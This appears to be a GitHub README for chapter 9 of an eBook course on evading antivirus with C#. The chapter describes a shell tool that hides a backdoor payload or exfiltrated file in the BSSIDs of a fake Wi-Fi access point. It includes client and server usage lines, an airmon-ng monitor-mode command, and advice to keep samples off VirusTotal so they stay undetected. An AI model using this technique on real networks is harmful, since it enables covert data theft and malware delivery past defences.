# Course : Bypassing Anti Viruses by C#.NET Programming

Part 2 (Infil/Exfiltration/Transferring Techniques by C#)  , Chapter 9 : Transferring Backdoor Payload by Wireless Traffic (BSSID)

eBook : Bypassing Anti Viruses by C#.NET Programming

eBook chapter 9 , PDF Download : https://github.com/DamonMohammadbagher/eBook-BypassingAVsByCSharp/tree/master/CH9

Related Video : 

Video 1 C# Code : https://youtu.be/W0dJGln3tls




Warning :Don't Use "www.virustotal.com" or something like that , Never Ever ;D

Recommended:

STEP 1 : Use each AV one by one in your LAB .

STEP 2 : after "AV Signature Database Updated" your Internet Connection should be "Disconnect" .

STEP 3 : Now you can Copy and Paste your C# code to your Virtual Machine for test .

# NativePayload_BSSID.sh  help :

Example Step1: (Client Side ) ./NativePayload_BSSID.sh -f text-file Fake-AP-Name MonitorMode-Interface

Example Step2: (Server Side ) ./NativePayload_BSSID.sh -s wlanx Exfil-Dump-file

example System A : ./NativePayload_BSSID.sh -f mytext.txt myfakeAP Wlan3mon

example System B : ./NativePayload_BSSID.sh -s wlan0 ExfilDumped.txt

Description: with Step1 (system A) you will inject bytes for (mytext.txt) file to BSSID for Fake AP in this case (myfakeAP) , with Step2 on (system B) you can have this text file via Scanning Fake AP on AIR by Wireless traffic (Using iwlist tool)

Note : before step1 you should make MonitorMode Interface (WlanXmon) by this command for example : airmon-ng start wlan3


![](https://github.com/DamonMohammadbagher/NativePayload_BSSID/blob/master/Chapter%209%20-%20Transferring%20Backdoor%20Payload%20by%20Wireless%20Traffic%20-BSSID/NativePayload_BSSID1.png)

![](https://github.com/DamonMohammadbagher/NativePayload_BSSID/blob/master/Chapter%209%20-%20Transferring%20Backdoor%20Payload%20by%20Wireless%20Traffic%20-BSSID/NativePayload_BSSID2.png)
